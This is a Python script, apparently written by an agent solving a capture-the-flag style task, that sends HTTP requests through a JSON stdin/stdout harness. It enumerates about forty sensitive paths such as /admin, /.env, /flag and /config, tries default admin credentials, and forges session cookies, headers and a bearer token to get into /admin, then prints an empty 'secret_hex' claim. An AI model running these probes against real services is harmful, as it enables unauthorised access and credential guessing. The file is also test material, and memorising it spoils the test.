import json, sys, base64

def req(method, path, headers=None, body=None):
    m = {"http": {"method": method, "path": path}}
    if headers:
        m["http"]["headers"] = headers
    if body is not None:
        m["http"]["body"] = body
    sys.stdout.write(json.dumps(m) + "\n")
    sys.stdout.flush()
    line = sys.stdin.readline()
    if not line:
        return None
    r = json.loads(line)
    b = r.get("body_b64")
    t = ""
    if b:
        try:
            t = base64.b64decode(b).decode("utf-8", "replace")
        except Exception:
            t = ""
    return (r.get("status"), t)

log = []
def show(tag, res):
    if res is None:
        log.append(tag + "|NOREP")
        return
    st, t = res
    if st == 404 and "not found" in t:
        log.append(tag + "|404")
    else:
        log.append(tag + "|" + str(st) + "|" + t[:400].replace("\n", " "))

paths = ["/login", "/auth", "/session", "/signin", "/admin/login", "/admin", "/admin/", "/admin/area",
         "/admin/index", "/admin/dashboard", "/admin/secret", "/api/admin", "/api/secret", "/api/v1/admin",
         "/index.html", "/", "/home", "/me", "/whoami", "/user", "/register", "/signup", "/token",
         "/api/session", "/api/login", "/debug", "/status", "/info", "/version", "/config", "/metrics",
         "/admin_area", "/administrator", "/dashboard", "/panel", "/cp", "/.env", "/admin/flag", "/flag",
         "/reserved", "/protected", "/secure", "/private"]
for p in paths:
    show("GET " + p, req("GET", p))

log.append("=== POST probes ===")
show("POST /login u=admin", req("POST", "/login", {"Content-Type": "application/json"}, json.dumps({"user": "admin", "password": "admin"})))
show("POST /login un=admin", req("POST", "/login", {"Content-Type": "application/json"}, json.dumps({"username": "admin", "password": "password"})))
show("POST /auth", req("POST", "/auth", {"Content-Type": "application/json"}, json.dumps({"user": "admin", "password": "admin"})))
show("GET /admin ck=session=admin", req("GET", "/admin", {"Cookie": "session=admin"}))
show("GET /admin xauth", req("GET", "/admin", {"X-Session": "admin", "X-Token": "admin"}))
show("GET /admin bearer", req("GET", "/admin", {"Authorization": "Bearer admin"}))

sys.stderr.write("\n".join(log) + "\n")
print('CLAIM:{"secret_hex": ""}')